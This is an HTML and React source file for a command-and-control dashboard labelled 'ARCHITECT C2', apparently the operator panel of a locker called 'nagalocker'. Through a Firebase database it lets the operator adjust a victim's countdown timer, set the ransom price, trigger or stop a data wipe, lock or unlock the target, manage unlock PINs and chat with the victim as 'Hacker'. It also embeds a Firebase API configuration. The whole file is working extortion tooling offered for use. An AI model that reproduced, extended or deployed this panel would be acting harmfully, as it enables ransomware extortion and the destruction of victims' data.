<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARCHITECT C2 - Admin Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono&display=swap');
        body { font-family: 'JetBrains Mono', monospace; background-color: #020617; color: #cbd5e1; }
        .font-orbit { font-family: 'Orbitron', sans-serif; }
        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.3); }
        .scrollbar-hide::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, onSnapshot, updateDoc, arrayUnion, arrayRemove, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
            authDomain: "nagalocker.firebaseapp.com",
            projectId: "nagalocker",
            storageBucket: "nagalocker.firebasestorage.app",
            messagingSenderId: "529236383091",
            appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
            measurementId: "G-S98ECJN5LY"
        };

        window.FirebaseLib = {
            app: initializeApp(firebaseConfig),
            getFirestore, doc, onSnapshot, updateDoc, arrayUnion, arrayRemove, setDoc, getDoc,
            getAuth, signInAnonymously, onAuthStateChanged
        };
        window.dispatchEvent(new Event('firebase-ready'));
    </script>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function App() {
            const [fbReady, setFbReady] = useState(false);
            const [user, setUser] = useState(null);
            const [state, setState] = useState({
                timeLeft: 1800, ransom: '300.000', messages: [],
                isWiping: false, isLocked: true, validPins: []
            });
            const [input, setInput] = useState('');
            const [newPin, setNewPin] = useState('');
            
            const docPath = ["artifacts", "nagalocker", "public", "data", "locker_state", "current"];

            useEffect(() => {
                const handleReady = () => setFbReady(true);
                if (window.FirebaseLib) handleReady();
                else window.addEventListener('firebase-ready', handleReady);
            }, []);

            useEffect(() => {
                if (!fbReady) return;
                const { getAuth, signInAnonymously, getFirestore, doc, onSnapshot } = window.FirebaseLib;
                signInAnonymously(getAuth());
                const db = getFirestore();
                const docRef = doc(db, ...docPath);

                return onSnapshot(docRef, (s) => s.exists() && setState(s.data()));
            }, [fbReady]);

            const updateField = async (field, value) => {
                const { getFirestore, doc, updateDoc } = window.FirebaseLib;
                const db = getFirestore();
                await updateDoc(doc(db, ...docPath), { [field]: value });
            };

            const addPin = async () => {
                if (!newPin.trim()) return;
                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                const db = getFirestore();
                await updateDoc(doc(db, ...docPath), {
                    validPins: arrayUnion(newPin)
                });
                setNewPin('');
            };

            const removePin = async (pin) => {
                const { getFirestore, doc, updateDoc, arrayRemove } = window.FirebaseLib;
                const db = getFirestore();
                await updateDoc(doc(db, ...docPath), {
                    validPins: arrayRemove(pin)
                });
            };

            const sendMsg = async () => {
                if (!input.trim()) return;
                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                const db = getFirestore();
                await updateDoc(doc(db, ...docPath), {
                    messages: arrayUnion({ sender: 'Hacker', text: input, time: Date.now() })
                });
                setInput('');
            };

            useEffect(() => { window.lucide && lucide.createIcons(); }, [state]);

            if (!fbReady) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-orbit">ESTABLISHING C2...</div>;

            return (
                <div className="min-h-screen p-4 lg:p-8 flex flex-col max-w-7xl mx-auto">
                    <header className="flex justify-between items-center glass p-6 rounded-[2rem] mb-8 shadow-2xl border border-slate-800">
                        <div className="flex items-center gap-4">
                            <div className="bg-red-600 p-3 rounded-2xl"><i data-lucide="user-cog" className="text-white w-8 h-8"></i></div>
                            <div>
                                <h1 className="text-2xl font-black text-white italic tracking-tighter font-orbit uppercase">Architect C2</h1>
                                <p className="text-[10px] text-slate-500 uppercase font-black">Node: <span className="text-green-500">ACTIVE</span></p>
                            </div>
                        </div>
                        <div className="text-right">
                            <p className="text-[10px] text-slate-500 font-bold uppercase">Target OS</p>
                            <p className={`text-xs font-black font-orbit ${state.isLocked ? 'text-red-500' : 'text-green-500'}`}>{state.isLocked ? 'LOCKED' : 'DECRYPTED'}</p>
                        </div>
                    </header>

                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 flex-1">
                        <div className="lg:col-span-2 space-y-6">
                            <section className="glass p-8 rounded-[2.5rem] shadow-xl">
                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-8 flex items-center gap-2">
                                    <i data-lucide="zap" className="w-4 h-4"></i> Remote Payload
                                </h2>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                                    <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase">Time Left (Mins)</p>
                                        <div className="flex items-center justify-between">
                                            <span className="text-2xl font-black text-red-500 font-orbit">{Math.floor(state.timeLeft / 60)}m</span>
                                            <div className="flex gap-2">
                                                <button onClick={() => updateField('timeLeft', Math.max(0, state.timeLeft - 300))} className="p-2 bg-slate-800 rounded-lg hover:bg-red-900/40">-5</button>
                                                <button onClick={() => updateField('timeLeft', state.timeLeft + 300)} className="p-2 bg-slate-800 rounded-lg hover:bg-green-900/40">+5</button>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase tracking-widest">Ransom Price</p>
                                        <input className="bg-transparent border-b border-slate-700 w-full text-xl font-black text-white outline-none focus:border-red-600 font-orbit" value={state.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
                                    </div>
                                </div>
                                <div className="grid grid-cols-2 gap-4">
                                    <button onClick={() => updateField('isWiping', !state.isWiping)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${state.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500 hover:bg-red-600 hover:text-white'}`}>
                                        {state.isWiping ? 'Stop Wiping' : 'Execute Wipe'}
                                    </button>
                                    <button onClick={() => updateField('isLocked', !state.isLocked)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${state.isLocked ? 'bg-slate-800 text-green-500 hover:bg-green-600 hover:text-white' : 'bg-green-600 text-black'}`}>
                                        {state.isLocked ? 'Force Unlock' : 'Re-Lock'}
                                    </button>
                                </div>
                            </section>

                            <section className="glass p-8 rounded-[2.5rem] shadow-xl">
                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6">Database PIN (Multi-Access)</h2>
                                <div className="flex gap-2 mb-6">
                                    <input value={newPin} onChange={(e) => setNewPin(e.target.value)} placeholder="Input PIN Baru..." className="flex-1 bg-black/50 border border-slate-800 p-4 rounded-xl text-white outline-none focus:border-green-600 font-mono" />
                                    <button onClick={addPin} className="bg-green-600 text-black px-8 rounded-xl font-black text-xs uppercase shadow-lg shadow-green-900/20">Tambah</button>
                                </div>
                                <div className="flex flex-wrap gap-2 max-h-40 overflow-y-auto scrollbar-hide">
                                    {state.validPins && state.validPins.map((p, i) => (
                                        <div key={i} className="bg-slate-800 border border-slate-700 px-4 py-2 rounded-lg flex items-center gap-4 text-xs font-black group">
                                            <span className="text-green-500 font-mono">{p}</span>
                                            <button onClick={() => removePin(p)} className="text-red-500 opacity-30 group-hover:opacity-100 transition-opacity">×</button>
                                        </div>
                                    ))}
                                    {(!state.validPins || state.validPins.length === 0) && <p className="text-[10px] text-slate-600 italic">Database PIN kosong. Target tidak bisa unlock.</p>}
                                </div>
                            </section>
                        </div>

                        <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[600px] shadow-2xl">
                            <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 p-2 flex items-center gap-2">
                                <i data-lucide="message-square" className="w-4 h-4 text-red-500"></i> Victim Comms
                            </h2>
                            <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide text-[11px]">
                                {state.messages && state.messages.map((m, i) => (
                                    <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
                                        <div className={`max-w-[85%] p-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-lg shadow-red-900/20' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>
                                            {m.text}
                                        </div>
                                        <span className="text-[8px] text-slate-600 mt-1 uppercase font-black tracking-tighter mx-2">{m.sender}</span>
                                    </div>
                                ))}
                            </div>
                            <div className="flex gap-2">
                                <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Ketik balasan..." className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none text-white focus:border-red-600 transition-all shadow-inner" />
                                <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all active:scale-95 shadow-lg"><i data-lucide="send" className="text-white w-5 h-5"></i></button>
                            </div>
                        </div>
                    </div>
                </div>
            );
        }

        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
        setInterval(() => window.lucide && lucide.createIcons(), 1000);
    </script>
</body>
</html>
